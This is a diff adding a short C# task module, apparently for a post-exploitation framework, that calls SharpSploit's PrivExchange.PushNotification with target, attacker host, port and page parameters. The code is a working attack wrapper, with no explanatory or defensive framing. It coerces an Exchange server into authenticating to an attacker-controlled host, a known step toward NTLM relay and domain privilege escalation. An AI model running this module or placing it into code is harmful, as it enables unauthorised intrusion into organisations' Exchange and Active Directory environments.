@@ -1,0 +1,12 @@
+using System;
+  
+using SharpSploit.Misc;
+
+public static class Task
+{
+    public static string Execute(string targetHost, string attackerHost, string attackerPort, string attackerPage, string SSL, string exchangeVersion, string exchangePort)
+    {
+        string results = PrivExchange.PushNotification(targetHost, attackerHost, attackerPort, attackerPage, SSL, exchangeVersion, exchangePort);
+        return results.ToString();
+    }
+}
